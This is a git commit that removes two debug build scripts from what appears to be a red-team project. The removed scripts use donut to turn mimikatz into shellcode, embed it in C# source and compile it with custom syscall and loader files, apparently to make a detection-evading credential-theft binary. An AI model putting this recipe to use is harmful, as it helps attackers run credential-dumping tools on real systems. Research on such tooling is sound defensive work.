42d861ade6de13a9135a47cbcce5cebe29a730ce
phra <greensoncio@gmail.com>
2020-10-17 19:25:29 +0200

    chore: remove debug files

--- dotnet/build-32.sh
+++
@@ -1,7 +0,0 @@
-cp Program.cs test.cs
-echo 'public static class Global {' >> test.cs
-echo -n 'public static ' >> test.cs
-donut -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"' ../mimikatz/Win32/mimikatz.exe  -f 7 -o mimi.cs
-cat mimi.cs >> test.cs
-echo '}' >> test.cs
-mcs -optimize- -platform:x86 -unsafe -out:test.exe test.cs NativeSysCall.cs Natives.cs CustomLoadLibrary.cs
--- dotnet/build.sh
+++
@@ -1,7 +0,0 @@
-cp Program.cs test.cs
-echo 'public static class Global {' >> test.cs
-echo -n 'public static ' >> test.cs
-donut -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"' ../mimikatz/x64/mimikatz.exe  -f 7 -o mimi.cs
-cat mimi.cs >> test.cs
-echo '}' >> test.cs
-mcs -optimize- -unsafe -platform:x64 -out:test.exe test.cs NativeSysCall.cs Natives.cs CustomLoadLibrary.cs
